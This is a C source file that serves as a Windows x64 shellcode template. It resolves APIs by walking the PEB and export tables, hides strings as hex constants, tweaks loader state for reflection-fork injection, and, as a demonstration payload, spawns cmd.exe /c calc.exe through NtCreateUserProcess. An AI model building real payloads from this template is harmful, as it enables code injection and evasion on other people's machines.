#include <stdint.h>

#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include "Header.h"
#include <winternl.h>
#pragma comment(lib, "ntdll")
#pragma warning (push, 0)

typedef struct _EX_PEB_LDR_DATA {
	ULONG                   Length;
	BOOLEAN                 Initialized;
	PVOID                   SsHandle;
	LIST_ENTRY              InLoadOrderModuleList;
	LIST_ENTRY              InMemoryOrderModuleList;
	LIST_ENTRY              InInitializationOrderModuleList;
	void* EntryInProgress;
	unsigned __int8 ShutdownInProgress;
	void* ShutdownThreadId;


} _EX_PEB_LDR_DATA, * _EX_PPEB_LDR_DATA;

typedef enum _LDR_DDAG_STATE
{
	LdrModulesMerged = -5,
	LdrModulesInitError = -4,
	LdrModulesSnapError = -3,
	LdrModulesUnloaded = -2,
	LdrModulesUnloading = -1,
	LdrModulesPlaceHolder = 0,
	LdrModulesMapping = 1,
	LdrModulesMapped = 2,
	LdrModulesWaitingForDependencies = 3,
	LdrModulesSnapping = 4,
	LdrModulesSnapped = 5,
	LdrModulesCondensed = 6,
	LdrModulesReadyToInit = 7,
	LdrModulesInitializing = 8,
	LdrModulesReadyToRun = 9
} LDR_DDAG_STATE;

typedef enum _LDR_DLL_LOAD_REASON
{
	LoadReasonStaticDependency = 0x0,
	LoadReasonStaticForwarderDependency = 0x1,
	LoadReasonDynamicForwarderDependency = 0x2,
	LoadReasonDelayloadDependency = 0x3,
	LoadReasonDynamicLoad = 0x4,
	LoadReasonAsImageLoad = 0x5,
	LoadReasonAsDataLoad = 0x6,
	LoadReasonEnclavePrimary = 0x7,
	LoadReasonEnclaveDependency = 0x8,
	LoadReasonUnknown = 0xFFFFFFFF,
} LDR_DLL_LOAD_REASON;


struct __declspec(align(8)) _LDR_SERVICE_TAG_RECORD
{
	struct _LDR_SERVICE_TAG_RECORD* Next;
	unsigned int ServiceTag;
};

struct _LDRP_CSLIST
{
	SINGLE_LIST_ENTRY* Tail;
};

struct __declspec(align(8)) _LDR_DDAG_NODE
{
	LIST_ENTRY Modules;
	struct _LDR_SERVICE_TAG_RECORD* ServiceTagList;
	unsigned int LoadCount;
	unsigned int LoadWhileUnloadingCount;
	unsigned int LowestLink;
	struct _LDRP_CSLIST Dependencies;
	struct _LDRP_CSLIST IncomingDependencies;
	enum _LDR_DDAG_STATE State;
	SINGLE_LIST_ENTRY CondenseLink;
	unsigned int PreorderNumber;
};

typedef struct _RTL_BALANCED_NODE
{
	union
	{
		struct _RTL_BALANCED_NODE* Children[2];
		struct
		{
			struct _RTL_BALANCED_NODE* Left;
			struct _RTL_BALANCED_NODE* Right;
		};
	};
	union
	{
		UCHAR Red : 1;
		UCHAR Balance : 2;
		ULONG_PTR ParentValue;
	};
} RTL_BALANCED_NODE, * PRTL_BALANCED_NODE;

typedef struct _LDR_MODULE
{
	LIST_ENTRY      InLoadOrderModuleList;
	LIST_ENTRY      InMemoryOrderModuleList;
	LIST_ENTRY      InInitializationOrderModuleList;
	PVOID           BaseAddress;
	PVOID           EntryPoint;
	ULONG           SizeOfImage;
	UNICODE_STRING  FullDllName;
	UNICODE_STRING  BaseDllName;
	ULONG           Flags;
	SHORT           LoadCount;
	SHORT           TlsIndex;
	LIST_ENTRY      HashTableEntry;
	ULONG           TimeDateStamp;
	ULONG           AciveEntryContext;
	ULONG           Lock;
	ULONG           Trash;
	ULONG           Trash2;
	struct _LDR_DDAG_NODE* DdagNode;
} LDR_MODULE, * PLDR_MODULE;

typedef struct _LDR_DATA_TABLE_ENTRYEX
{
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	void* DllBase;
	void* EntryPoint;
	unsigned int SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	unsigned int Flags;
	unsigned __int16 ObsoleteLoadCount;
	unsigned __int16 TlsIndex;
	LIST_ENTRY HashLinks;
	unsigned int TimeDateStamp;
	struct _ACTIVATION_CONTEXT* EntryPointActivationContext;
	void* Lock;
	struct _LDR_DDAG_NODE* DdagNode;
	LIST_ENTRY NodeModuleLink;
	struct _LDRP_LOAD_CONTEXT* LoadContext;
	void* ParentDllBase;
	void* SwitchBackContext;
	RTL_BALANCED_NODE BaseAddressIndexNode;
	RTL_BALANCED_NODE MappingInfoIndexNode;
	unsigned __int64 OriginalBase;
	LARGE_INTEGER LoadTime;
	unsigned int BaseNameHashValue;
	LDR_DLL_LOAD_REASON LoadReason;
	unsigned int ImplicitPathOptions;
	unsigned int ReferenceCount;
	unsigned int DependentLoadFlags;
	unsigned __int8 SigningLevel;
}__declspec(align(4)) LDR_DATA_TABLE_ENTRYEX;



// some MACRO fuctions to be used from the shellcode 
#define  TOLOWERC(c,lower_c) \
	if (c >= 'A' && c <= 'Z') \
		lower_c =  c + 'a' - 'A';\
    else\
		lower_c = c;\


#define TOLOWERW(wc,lower_wc) \
     cwc = (char)wc;\
	lowr_cwc;\
	if(wc > 0xff){\
lower_wc = wc; \
    }\
    else {\
	TOLOWERC(cwc, lowr_cwc);\
	lower_wc = (wint_t)lowr_cwc;\
    }

#define WCSICMP(cs, ct, res) \
	wchar_t csl, ctl;\
    res = 1;\
	do\
	{\
		if (*cs == 0) {\
			res = 0; \
			break;\
		}\
		TOLOWERW(*cs,csl)\
        TOLOWERW(*ct,ctl)\
        cs++;\
		ct++;\
	}while(csl==ctl);\
    if(res != 0){\
		cs--;\
		ct--;\
		TOLOWERW(*cs,csl)\
        TOLOWERW(*ct,ctl)\
		res  = (wint_t)csl - (wint_t)ctl; \
	}

#define  GETLDRENTRYBYNAME(ModuleName, pLdr, FounbLdrEntry)\
 pListEntry = pListHead->Flink;\
 do\
 {\
        LDR_DATA_TABLE_ENTRY* pCurEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);\
        int res = 0;\
        char cwc;\
        char lowr_cwc;\
        currentName = ((PLDR_MODULE)pCurEntry)->BaseDllName.Buffer;\
        searchedName = ModuleName;\
        WCSICMP(currentName, searchedName, res)\
            if (!res){\
                FounbLdrEntry = pCurEntry;\
                break;\
                }\
        pListEntry = pListEntry->Flink;\
 } while (pListEntry != pListHead);



// This is the shellcode template function.
// Modify it to make it fit your needs.
//
// Keep in mind:
// Don't call any functions that you didn't load here (like CRT functions). If you want to split up your shellcode into multiple functions use macro functions like demonstrated above
__declspec(noinline) void shellcode_template()
{
	// Depending on your target you might have to 16-bit align stack pointer. Just place `and rsp, 0fffffffffffffff0h` after the initial `sub rsp XXXX` that will be generated at the start of the function.

	// Load Process Environment Block.
	PEB* pProcessEnvironmentBlock = (PEB*)__readgsqword(0x60);
	_EX_PPEB_LDR_DATA pLdrData = (_EX_PPEB_LDR_DATA)pProcessEnvironmentBlock->Ldr;

	//set shutdown state to 0 - to negate the reflection fork statup 
	pLdrData->ShutdownInProgress = 0;

	// We will use these structs to store strings.
	// We are using a struct to make sure strings don't end up in another section of the executable where we wouldn't be able to address them in a different process.
	struct
	{
		uint64_t text0, text1;
	} string16;

	struct
	{
		uint64_t text0, text1, text2;
	} string24;

	struct
	{
		uint64_t text0, text1, text2, text3;
	} string32;

	struct
	{
		uint64_t text0, text1, text2, text3, text4, text5, text6, text7;
	} wstring64;

	struct
	{
		uint64_t text0, text1, text2, text3, text4, text5, text6, text7, text8, text9, text10, text11, text12, text13, text14, text15, text16;
	} wstring136;


	const PLIST_ENTRY pListHead = &pProcessEnvironmentBlock->Ldr->InMemoryOrderModuleList;
	PLIST_ENTRY pListEntry = pListHead->Flink;
	wchar_t* searchedName;
	wchar_t* currentName;

	// LOAD kernel32.dll wide 
	string32.text0 = 0x006e00720065006b;
	string32.text1 = 0x00320033006c0065;
	string32.text2 = 0x006c006c0064002e;
	string32.text3 = 0x0000000000000000;

	LDR_DATA_TABLE_ENTRY* pKernel32TableEntry = NULL;
	GETLDRENTRYBYNAME((PWSTR)&string32.text0, pProcessEnvironmentBlock->Ldr, pKernel32TableEntry)
		PLDR_MODULE pKernel32TableMod = (PLDR_MODULE)pKernel32TableEntry;
	// LOAD kernel32.dll wide 
	string32.text0 = 0x006c00640074006e;
	string32.text1 = 0x006c0064002e006c;
	string32.text2 = 0x000000000000006c;
	string32.text3 = 0x0000000000000000;
	//LDR_DATA_TABLE_ENTRY *pNtdllTableEntry = GetLdrEntryByName((PWSTR)&string32.text0, pProcessEnvironmentBlock->Ldr); //CONTAINING_RECORD(pProcessEnvironmentBlock->Ldr->InMemoryOrderModuleList.Flink->Flink, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
	LDR_DATA_TABLE_ENTRY* pNtdllTableEntry = NULL;
	GETLDRENTRYBYNAME((PWSTR)&string32.text0, pProcessEnvironmentBlock->Ldr, pNtdllTableEntry)


		IMAGE_DOS_HEADER* pDosHeader = (IMAGE_DOS_HEADER*)pKernel32TableEntry->DllBase;


	// In order to get the exported functions we need to go to the NT PE header.
	IMAGE_NT_HEADERS* pNtHeader = (IMAGE_NT_HEADERS*)((size_t)pDosHeader + pDosHeader->e_lfanew);

	// From the NtHeader we can extract the virtual address of the export directory of this module.
	IMAGE_EXPORT_DIRECTORY* pExports = (IMAGE_EXPORT_DIRECTORY*)((size_t)pDosHeader + pNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	// The exports directory contains both a list of function _names_ of this module and the associated _addresses_ of the functions.
	const int32_t* pNameOffsets = (const int32_t*)((size_t)pDosHeader + pExports->AddressOfNames);


	// We're now looking for the `GetProcAddress` function. Since there's no other function starting with `GetProcA` we'll just find that instead.
	string16.text0 = 0x41636F7250746547; // `GetProcA`

	int32_t i = 0;

	// We're just extracting the first 8 bytes of the strings and compare them to `GetProcA`. We'll find it eventually.
	while (*(uint64_t*)((size_t)pDosHeader + pNameOffsets[i]) != string16.text0)
		++i;
	// We have found the index of `GetProcAddress`.

	// The entry at an index in `AddressOfNames` corresponds to an entry at the same index in `AddressOfNameOrdinals`, which resolves the index of a given name to it's corresponding entry in `AddressOfFunctions`. (DLLs can export unnamed functions, which will not be listed in `AddressOfNames`.)
	// Let's get the function name ordinal offsets and function offsets in order to retrieve the location of `GetProcAddress` in memory.
	const int16_t* pFunctionNameOrdinalOffsets = (const int16_t*)((size_t)pDosHeader + pExports->AddressOfNameOrdinals);
	const int32_t* pFunctionOffsets = (const int32_t*)((size_t)pDosHeader + pExports->AddressOfFunctions);

	// Now resolve the index in `pFunctionOffsets` from `pFunctionNameOrdinalOffsets` to get the address of the desired function in memory.
	typedef FARPROC(*GetProcAddressFunc)(HMODULE, const char*);
	GetProcAddressFunc pGetProcAddress = (GetProcAddressFunc)(const void*)((size_t)pDosHeader + pFunctionOffsets[pFunctionNameOrdinalOffsets[i]]);

	// For `kernel32.dll` this would technically work as well, because the index in `AddressOfNames` seems to always correspond to the the index in `AddressOfFunctions`, however this isn't technically correct.
	// GetProcAddressFunc pGetProcAddress = (GetProcAddressFunc)(const void *)((size_t)pDosHeader + pFunctionOffsets[i]);
	// Now that we've got `GetProcAddress`, let's use it to get `LoadLibraryA`.

	// A HMODULE is just a pointer to the base address of a module.
	HMODULE kernel32Dll = (HMODULE)pDosHeader;
	LDR_DATA_TABLE_ENTRYEX* pxNtdll = (LDR_DATA_TABLE_ENTRYEX*)pNtdllTableEntry;
	pxNtdll->ReferenceCount = 0xffffffff;
	HMODULE ntdllBase = (HMODULE)pNtdllTableEntry->DllBase;

	// Get `LoadLibraryA`.
	string16.text0 = 0x7262694C64616F4C; // `LoadLibr`
	string16.text1 = 0x0000000041797261; // `aryA\0\0\0\0`

	typedef HMODULE(*LoadLibraryAFunc)(const char*);
	typedef HANDLE(*CreateMutexAFunc)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName);
	typedef NTSTATUS(NTAPI* NtAllocateVirtualMemoryFunc)(
		IN HANDLE ProcessHandle,
		IN OUT PVOID* BaseAddress,
		IN ULONG ZeroBits,
		IN OUT PULONG RegionSize,
		IN ULONG AllocationType,
		IN ULONG Protect);
	typedef NTSTATUS(NTAPI* RtlCopyMappedMemoryFunc)(void* pDst, const void* pSrc, SIZE_T bytes);

	LoadLibraryAFunc pLoadLibraryA = (LoadLibraryAFunc)pGetProcAddress(kernel32Dll, (const char*)&string16.text0);

#ifdef CREATE_PROCESS_SHELLCODE
	typedef NTSTATUS(NTAPI* NtCreateUserProcessFunc)(
		__out PHANDLE ProcessHandle,
		__out PHANDLE ThreadHandle,
		__in ACCESS_MASK ProcessDesiredAccess,
		__in ACCESS_MASK ThreadDesiredAccess,
		__in_opt PVOID ProcessObjectAttributes,
		__in_opt PVOID ThreadObjectAttributes,
		__in ULONG ProcessFlags,
		__in ULONG ThreadFlags,
		__in_opt PVOID ProcessParameters,
		__inout PPS_CREATE_INFO CreateInfo,
		__in_opt PPS_ATTRIBUTE_LIST AttributeList
		);

	typedef PVOID(NTAPI* RtlAllocateHeap)(
		_In_ PVOID HeapHandle,
		_In_opt_ ULONG Flags,
		_In_ SIZE_T Size
		);

	typedef NTSTATUS(NTAPI* RtlCreateProcessParametersEx)(
		_Out_ PRTL_USER_PROCESS_PARAMETERS* pProcessParameters,
		_In_ PUNICODE_STRING ImagePathName,
		_In_opt_ PUNICODE_STRING DllPath,
		_In_opt_ PUNICODE_STRING CurrentDirectory,
		_In_opt_ PUNICODE_STRING CommandLine,
		_In_opt_ PVOID Environment,
		_In_opt_ PUNICODE_STRING WindowTitle,
		_In_opt_ PUNICODE_STRING DesktopInfo,
		_In_opt_ PUNICODE_STRING ShellInfo,
		_In_opt_ PUNICODE_STRING RuntimeData,
		_In_ ULONG Flags // Pass RTL_USER_PROCESS_PARAMETERS_NORMALIZED to keep parameters normalized
		);


	typedef VOID(NTAPI* RtlInitUnicodeStringFunc)(
		PUNICODE_STRING DestinationString,
		PCWSTR SourceString
		);

	typedef NTSTATUS(NTAPI* NtSuspendThreadFunc)(HANDLE ThreadHandle, PULONG PreviousSuspendCount OPTIONAL);

	// LOAD RtlAllocateHeap
	string16.text0 = 0x636f6c6c416c7452;
	string16.text1 = 0x0070616548657461;
	RtlAllocateHeap pRtlAllocateHeap = (RtlAllocateHeap)pGetProcAddress(ntdllBase, (const char*)&string16.text0);

	// LOAD RtlCreateProcessParametersEx
	string32.text0 = 0x74616572436c7452;
	string32.text1 = 0x737365636f725065;
	string32.text2 = 0x6574656d61726150;
	string32.text3 = 0x0000000078457372;
	RtlCreateProcessParametersEx pRtlCreateProcessParametersEx = (RtlCreateProcessParametersEx)pGetProcAddress(ntdllBase, (const char*)&string32.text0);

	// LOAD RtlCreateProcessParametersEx
	string24.text0 = 0x657461657243744e;
	string24.text1 = 0x636f725072657355;
	string24.text2 = 0x0000000000737365;
	NtCreateUserProcessFunc  pNtCreateUserProcess = (NtCreateUserProcessFunc)pGetProcAddress(ntdllBase, (const char*)&string24.text0);

	//load RtlInitUnicodeString
	string24.text0 = 0x5574696e496c7452;
	string24.text1 = 0x745365646f63696e;
	string24.text2 = 0x00000000676e6972;

	RtlInitUnicodeStringFunc pRtlInitUnicodeString = (RtlInitUnicodeStringFunc)pGetProcAddress(ntdllBase, (const char*)&string24.text0);


	// load wide \\??\\C:\\Windows\\System32\\cmd.exe
	wstring64.text0 = 0x005c003f003f005c;
	wstring64.text1 = 0x0057005c003a0043;
	wstring64.text2 = 0x006f0064006e0069;
	wstring64.text3 = 0x0053005c00730077;
	wstring64.text4 = 0x0065007400730079;
	wstring64.text5 = 0x005c00320033006d;
	wstring64.text6 = 0x002e0064006d0063;
	wstring64.text7 = 0x0000006500780065;
	UNICODE_STRING NtImagePath;
	pRtlInitUnicodeString(&NtImagePath, (PWSTR)&wstring64.text0);

	// load wide \\??\\C:\\Windows\\System32\\cmd.exe /c calc.exe
	wstring136.text0 = 0x005c003f003f005c;
	wstring136.text1 = 0x0057005c003a0043;
	wstring136.text2 = 0x006f0064006e0069;
	wstring136.text3 = 0x0053005c00730077;
	wstring136.text4 = 0x0065007400730079;
	wstring136.text5 = 0x005c00320033006d;
	wstring136.text6 = 0x002e0064006d0063;
	wstring136.text7 = 0x0020006500780065;
	wstring136.text8 = 0x006300200063002F;
	wstring136.text9 = 0x002E0063006C0061;
	wstring136.text10 = 0x0000006500780065;
	wstring136.text11 = 0x0000000000000000;

	UNICODE_STRING NtCommandline;
	pRtlInitUnicodeString(&NtCommandline, (PWSTR)&wstring136.text0);

	// Create the process parameters
	PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
	pRtlCreateProcessParametersEx(&ProcessParameters, &NtImagePath, NULL, NULL, &NtCommandline, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROCESS_PARAMETERS_NORMALIZED);

	// Initialize the PS_CREATE_INFO structure
	PS_CREATE_INFO CreateInfo = { 0 };
	CreateInfo.Size = sizeof(CreateInfo);
	CreateInfo.State = PsCreateInitialState;

	// Initialize the PS_ATTRIBUTE_LIST structure
	PPS_ATTRIBUTE_LIST AttributeList = (PS_ATTRIBUTE_LIST*)pRtlAllocateHeap(pProcessEnvironmentBlock->Reserved4[1], HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE)); //Reserved4[1] is ProcessHeap
	AttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST) - sizeof(PS_ATTRIBUTE);
	AttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
	AttributeList->Attributes[0].Size = NtImagePath.Length;
	AttributeList->Attributes[0].Value = (ULONG_PTR)NtImagePath.Buffer;

	// Create the process
	HANDLE hProcess, hThread = NULL;
	NTSTATUS ret = pNtCreateUserProcess(&hProcess, &hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, ProcessParameters, &CreateInfo, AttributeList);

	// Suspend current thread for examination
	// LOAD NtSuspendThread
	string16.text0 = 0x6e6570737553744e;
	string16.text1 = 0x0064616572685464;
	NtSuspendThreadFunc pNtSuspendThread = (NtSuspendThreadFunc)pGetProcAddress(ntdllBase, (const char*)&string16.text0);
	pNtSuspendThread((HANDLE)-2, NULL);
#endif

}

#pragma warning (pop)

//////////////////////////////////////////////////////////////////////////

// Just a main function to call your shell code.
int main()
{
	shellcode_template();

	MessageBoxA(NULL, "Shell code has been executed.", "Success!", MB_OK); // in case your modified shell code function did not exit the current process.
	return 0;
}
